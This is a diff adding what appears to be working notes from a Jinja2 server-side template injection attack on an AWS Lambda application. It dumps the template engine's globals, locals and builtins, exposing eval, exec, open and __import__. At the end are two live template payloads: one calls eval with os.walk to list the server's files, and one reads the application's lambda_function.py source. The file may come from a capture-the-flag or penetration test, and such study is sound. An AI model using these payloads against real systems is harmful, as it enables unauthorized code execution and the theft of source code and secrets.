@@ -1,0 +1,82 @@
+globals():
+'__name__': 'jinja2.runtime'
+'__doc__': 'The runtime functions and state used by compiled templates.'
+'__package__': 'jinja2'
+'__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f04777811f0>,
+'__spec__': ModuleSpec(name='jinja2.runtime', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f04777811f0>, origin='/var/task/jinja2/runtime.py')
+'__file__': '/var/task/jinja2/runtime.py'
+'__cached__': '/var/task/jinja2/__pycache__/runtime.cpython-38.pyc'
+'__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\",
+'__package__': '',
+'__loader__': <class '_frozen_importlib.BuiltinImporter'>,
+'__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>),
+'__build_class__': <built-in function __build_class__>,
+'__import__': <built-in function __import__>,
+'abs': <built-in function abs>,
+'all': <built-in function all>,
+'any': <built-in function any>,
+'ascii': <built-in function ascii>,
+'bin': <built-in function bin>,
+'breakpoint': <built-in function breakpoint>,
+'callable': <built-in function callable>,
+'chr': <built-in function chr>,
+'compile': <built-in function compile>,
+'delattr': <built-in function delattr>,
+'dir': <built-in function dir>,
+'divmod': <built-in function divmod>,
+'eval': <built-in function eval>,
+'exec': <built-in function exec>,
+'format': <built-in function format>,
+'getattr': <built-in function getattr>,
+'globals': <built-in function globals>,
+'hasattr': <built-in function hasattr>,
+'hash': <built-in function hash>,
+'hex': <built-in function hex>,
+'id': <built-in function id>,
+'input': <built-in function input>,
+'isinstance': <built-in function isinstance>,
+'issubclass': <built-in function issubclass>,
+'iter': <built-in function iter>,
+'len': <built-in function len>,
+'locals': <built-in function locals>,
+'max': <built-in function max>,
+'min': <built-in function min>,
+'next': <built-in function next>,
+'oct': <built-in function oct>,
+'ord': <built-in function ord>,
+'pow': <built-in function pow>,
+'print': <built-in function print>,
+'repr': <built-in function repr>,
+'round': <built-in function round>,
+'setattr': <built-in function setattr>,
+'sorted': <built-in function sorted>,
+'sum': <built-in function sum>,
+'vars': <built-in function vars>,
+'None': None,
+'Ellipsis': Ellipsis,
+'NotImplemented': NotImplemented,
+'False': False,
+'True': True,
+'bool': <class 'bool'>,
+'memoryview': <class 'memoryview'>,
+'bytearray': <class 'bytearray'>,
+'bytes': <class 'bytes'>,
+'classmethod': <class 'classmethod'>,
+'complex': <class 'complex'>,
+'dict': <class 'dict'>,
+'enumerate': <class 'enumerate'>,
+'filter': <class 'filter'>,
+'float': <class 'float'>,
+'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'Sto...
+'sys': <module 'sys' (built-in)>, 'chain': <class 'itertools.chain'>, 'MethodType': <class 'method'>, 'escape': <built-in function escape>
+...
+
+locals():
+'_Context__self': <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7fa7776a9700>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'dir': <built-in function dir>, 'help': Type help() for interactive help, or help(object) for help about object., 'locals': <built-in function locals>, 'globals': <built-in function globals>, 'open': <built-in function open>} of None>, 
+_Context__obj': <built-in function locals>, 'args': (), 'kwargs': {}, '__traceback_hide__': True, 'fn': <method-wrapper '__call__' of builtin_function_or_method object at 0x7fa7855539a0>, 'fn_type': 'environmentf.........
+
+__builtins__:
+['__add__', '__bool__', '__call__', '__class__', '__complex__', '__delattr__', '__dir__', '__div__', '__doc__', '__eq__', '__float__', '__floordiv__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__int__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__module__', '__mul__', '__ne__', '__neg__', '__new__', '__nonzero__', '__pos__', '__pow__', '__radd__', '__rdiv__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rmod__', '__rmul__', '__rpow__', '__rsub__', '__rtruediv__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '_fail_with_undefined_error', '_undefined_exception', '_undefined_hint', '_undefined_message', '_undefined_name', '_undefined_obj']
+
+{{ globals()['__builtins__']['eval'](\"[x for x in __import__('os').walk('.')]\") }}s
+{{ globals()['__builtins__']['eval'](\"open('lambda_function.py', 'r').read()[1000:]\") }}
